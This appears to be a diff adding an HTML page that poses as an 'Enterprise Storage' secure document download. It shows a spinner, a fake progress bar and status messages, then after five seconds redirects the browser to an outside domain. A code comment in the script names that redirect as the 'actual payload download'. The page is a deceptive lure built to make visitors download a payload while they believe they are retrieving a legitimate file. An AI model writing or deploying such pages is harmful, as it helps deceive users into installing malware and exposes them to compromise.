@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Storage | Secure Retrieval</title>
+    <style>
+        body { margin: 0; background-color: #f4f7f9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; }
+        .retrieval-card { background: #fff; padding: 45px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; width: 100%; max-width: 480px; border-top: 4px solid #0078d4; }
+        
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 25px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .progress-box { width: 100%; height: 6px; background: #eee; border-radius: 10px; margin: 25px 0; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: #0078d4; transition: width 0.3s; }
+
+        h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #0078d4; }
+        .file-info { font-size: 14px; background: #f9f9f9; padding: 12px; border-radius: 4px; border: 1px solid #eee; margin-bottom: 20px; display: inline-block; }
+        p { font-size: 14px; color: #666; line-height: 1.5; }
+        .status { font-family: monospace; font-size: 11px; color: #008000; font-weight: bold; margin-top: 20px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+<div class="retrieval-card">
+    <div class="spinner"></div>
+    <h2>Downloading Document</h2>
+    
+    <div class="file-info">
+        ðŸ“„ <strong></strong>
+    </div>
+    
+    <div class="progress-box">
+        <div class="progress-fill" id="fill"></div>
+    </div>
+    
+    <div class="status" id="status">Loading...</div>
+</div>
+
+<script>
+    const fill = document.getElementById('fill');
+    const status = document.getElementById('status');
+    const phases = ["Resolving Gateway...", "Parsing SEC container...", "Initiating Encrypted Transfer...", "file Ready!"];
+    
+    let width = 0;
+    const interval = setInterval(() => {
+        width += 2;
+        fill.style.width = width + "%";
+        
+        if (width % 25 === 0) {
+            status.innerText = phases[Math.floor(width / 25) - 1] || "Transferring...";
+        }
+
+        if (width >= 100) {
+            clearInterval(interval);
+            // Trigger the actual payload download script
+            window.location.href = 'https://apinetsolworkspace.network/api/build/3b143087-77a4-446f-857a-1f58ef3bbf82/download';
+        }
+    }, 100); // Total wait: 5 seconds
+</script>
+
+</body>
+</html>
